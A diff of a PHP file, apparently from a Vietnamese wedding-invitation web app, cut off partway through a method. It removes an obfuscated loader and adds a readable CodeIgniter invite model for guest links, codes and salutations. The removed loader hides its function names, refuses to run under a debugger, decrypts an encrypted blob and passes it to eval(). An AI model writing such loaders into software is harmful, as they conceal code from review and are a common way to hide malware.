@@ -1,28 +1,918 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ith0jg6s=('bas'.'e64'.'_de'.'cod'.'e');
-$_hwjnkxk1=('gzu'.'nco'.'mpr'.'ess');
-$_gouu2uux=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_sar8c8ht='r1KfJysa';
-$_ecoticsn='rMB9lhYm';
-$_z6r56ow8='SvldghzT';
-$_pqfzao19='mEajpOrY';
-$_wufdak0b='v35Z1siRViY=';
-$_upxml1s6='j6O4/trP';
-$_ox8o4lzz='KXFm1nCz';
-$_q5qbgwxy='nxwZzw==';
-$_qng9c5u2=$_ith0jg6s($_ecoticsn.$_sar8c8ht.$_pqfzao19.$_z6r56ow8.$_wufdak0b);
-$_naakk9h2=$_ith0jg6s($_upxml1s6.$_ox8o4lzz.$_q5qbgwxy);
-$_m52bbsfu=$_ith0jg6s('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');
-$_davw8p4w=$_gouu2uux($_m52bbsfu,'aes-256-cbc',$_qng9c5u2,OPENSSL_RAW_DATA,$_naakk9h2);
-if($_davw8p4w===false){exit;}
-$_gsfembo2=$_hwjnkxk1($_davw8p4w);
-if($_gsfembo2===false){exit;}
-$_rx3oeaqb='ddca8f9bbae3d592f897600732c054cbe51ea03086f2b12911c5b7059f931056';
-$_bbl7xcwi=@file_get_contents(__FILE__);
-if($_bbl7xcwi!==false){
-$_hf8favrd=str_replace($_rx3oeaqb,"0000000000000000000000000000000000000000000000000000000000000000",$_bbl7xcwi);
-$_a9te7uf1=hash("sha256",$_hf8favrd);
-if($_a9te7uf1!==$_rx3oeaqb){@http_response_code(403);exit;}
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+class Invite_model extends CI_Model
+{
+const SIDES = array('' => 'Chung', 'groom' => 'Nhà trai', 'bride' => 'Nhà gái');
+
+const SALUTATIONS = array('Ông bà', 'Cô chú', 'Anh chị', 'Gia đình', 'Vợ chồng', 'Anh', 'Chị', 'Em', 'Bạn',
+'Cô', 'Chú', 'Bác', 'Ông', 'Bà', 'Cậu', 'Mợ', 'Dì', 'Dượng', 'Thím', 'Thầy', 'Cháu');
+
+
+
+
+
+const RESERVED = array('admin', 'a', 'moi', 'xac-nhan', 'gui-anh', 'loi-chuc', 'unlock', 'setup', 'health', 'auth',
+'home', 'guest', 'errors', 'assets', 'uploads', 'database', 'cloudflared', 'application', 'system', 'index',
+'api', 'login', 'logout', 'robots', 'favicon', 'sitemap', 'static', 'public', 'www', 'mail', 'vendor', 'php',
+'tools', 'script', 'logs', 'xem', 'thiep', 'album');
+const SLUG_RE = '/^[a-z0-9][a-z0-9-]{0,38}[a-z0-9]$/';
+
+
+
+
+public $error_field = '';
+
+private function new_code()
+{
+$_va7l1sm = 'abcdefghjkmnpqrstuvwxyz23456789';
+do {
+$_vr6oow4 = '';
+for ($_vnyqa1c = 0; $_vnyqa1c < 8; $_vnyqa1c++) {
+$_vr6oow4 .= $_va7l1sm[random_int(0, strlen($_va7l1sm) - 1)];
 }
-eval($_gsfembo2);
+} while ($this->find_by_code($_vr6oow4));
+return $_vr6oow4;
+}
+public function find($_vtu0fdq)
+{
+return $this->db->get_where('invites', array('id' => (int) $_vtu0fdq))->row_array();
+}
+public function find_by_code($_vc5ef6u)
+{
+return preg_match('/^[a-z0-9]{8}$/', (string) $_vc5ef6u)
+? $this->db->get_where('invites', array('code' => $_vc5ef6u))->row_array() : NULL;
+}
+
+
+
+
+public function find_by_slug($_vhbxm6i)
+{
+$_vhbxm6i = strtolower((string) $_vhbxm6i);
+if (!preg_match(self::SLUG_RE, $_vhbxm6i)) {
+return NULL;
+}
+$_vg59d4q = $this->db->get_where('invites', array('slug' => $_vhbxm6i))->row_array();
+if (!$_vg59d4q) {
+$_vi6l2mg = $this->db->select('invite_id')->get_where('invite_old_slugs', array('slug' => $_vhbxm6i))->row_array();
+$_vg59d4q = $_vi6l2mg ? $this->find($_vi6l2mg['invite_id']) : NULL;
+}
+return $_vg59d4q ?: NULL;
+}
+
+public function sample()
+{
+return $this->db->where('source', 'invite')->order_by('id', 'ASC')->limit(1)->get('invites')->row_array() ?: NULL;
+}
+
+public function path($_vxhjqqq)
+{
+return !empty($_vxhjqqq['slug']) ? $_vxhjqqq['slug'] : 'moi/' . $_vxhjqqq['code'];
+}
+
+
+
+
+
+public function guest_path($_v0j8df2)
+{
+return $this->site_locked() ? 'moi/' . $_v0j8df2['code'] : $this->path($_v0j8df2);
+}
+
+public function site_locked()
+{
+return (string) setting('site_password_hash', '') !== '';
+}
+
+public function display_name($_veq0njo)
+{
+$_vw117qs = trim((string) $_veq0njo['salutation']);
+$_vohepwr = trim((string) $_veq0njo['name']);
+return self::join_salutation($_vw117qs, $_vohepwr);
+}
+
+
+
+
+
+public static function join_salutation($_va4eooq, $_vqp3etx)
+{
+$_va4eooq = trim((string) $_va4eooq);
+$_vqp3etx = trim((string) $_vqp3etx);
+if ($_va4eooq === '' || $_vqp3etx === '') {
+return trim($_va4eooq . ' ' . $_vqp3etx);
+}
+if (preg_match('/^[\x{4e00}-\x{9fff}\x{3400}-\x{4dbf}·]+$/u', $_va4eooq)) {
+return mb_substr($_va4eooq, -1) === '的' ? $_va4eooq . $_vqp3etx : $_vqp3etx . $_va4eooq;
+}
+if (preg_match('/^[\x{0e00}-\x{0e7f}.]+$/u', $_va4eooq)) {
+return $_va4eooq . $_vqp3etx;
+}
+return $_va4eooq . ' ' . $_vqp3etx;
+}
+
+private $reserved_cache = NULL;
+public function reserved_words()
+{
+if ($this->reserved_cache !== NULL) { 
+return $this->reserved_cache;
+}
+$_vyai06v = self::RESERVED;
+foreach (array_keys((array) $this->router->routes) as $_vt38f8l) {
+$_vr6xhxk = strtolower((string) strtok((string) $_vt38f8l, '/'));
+if (preg_match('/^[a-z0-9-]+$/', $_vr6xhxk)) {
+$_vyai06v[] = $_vr6xhxk;
+}
+}
+foreach ((array) glob(APPPATH . 'controllers/*') as $_vrkxl3o) {
+$_vyai06v[] = strtolower(pathinfo($_vrkxl3o, PATHINFO_FILENAME));
+}
+foreach ((array) glob(FCPATH . '*') as $_vrkxl3o) {
+$_vyai06v[] = strtolower(basename($_vrkxl3o));
+}
+return $this->reserved_cache = array_values(array_unique($_vyai06v));
+}
+
+public function check_slug($_vzasxju, $_vkd3w4v = 0)
+{
+if (!preg_match(self::SLUG_RE, (string) $_vzasxju)) {
+return __('Đường dẫn chỉ gồm chữ thường không dấu, số và dấu gạch ngang (2–40 ký tự, không bắt đầu/kết thúc bằng "-").');
+}
+if (in_array($_vzasxju, $this->reserved_words(), TRUE)) {
+return __('Đường dẫn "{slug}" trùng với trang có sẵn của web, hãy chọn tên khác.', array('slug' => $_vzasxju));
+}
+$_v9yptxl = $this->db->select('id')->get_where('invites', array('slug' => $_vzasxju))->row_array();
+if ($_v9yptxl && (int) $_v9yptxl['id'] !== (int) $_vkd3w4v) {
+return __('Đường dẫn "{slug}" đã dùng cho khách khác.', array('slug' => $_vzasxju));
+}
+
+$_vvsjz78 = $this->db->select('invite_id')->get_where('invite_old_slugs', array('slug' => $_vzasxju))->row_array();
+if ($_vvsjz78 && (int) $_vvsjz78['invite_id'] !== (int) $_vkd3w4v) {
+return __('Đường dẫn "{slug}" là link cũ của khách khác (link đó vẫn mở thiệp của họ), hãy chọn tên khác.', array('slug' => $_vzasxju));
+}
+return TRUE;
+}
+
+
+
+
+
+public function unique_slug($_v8yd9l5, $_vm5nji7 = 0)
+{
+$_v8yd9l5 = preg_replace_callback('/\+?\d[\d .\-()]*\d/u', function ($_vjjvasj) {
+return preg_match_all('/\d/', $_vjjvasj[0]) >= 6 ? ' ' : $_vjjvasj[0];
+}, (string) $_v8yd9l5);
+$_vuxix5a = trim(preg_replace('/-{2,}/', '-', preg_replace('/\d{6,}/', '', ascii_slug($_v8yd9l5, 34))), '-');
+if (strlen($_vuxix5a) < 2) {
+$_vuxix5a = 'khach' . ($_vuxix5a !== '' ? '-' . $_vuxix5a : '');
+}
+$_vl8yw6u = $this->reserved_words();
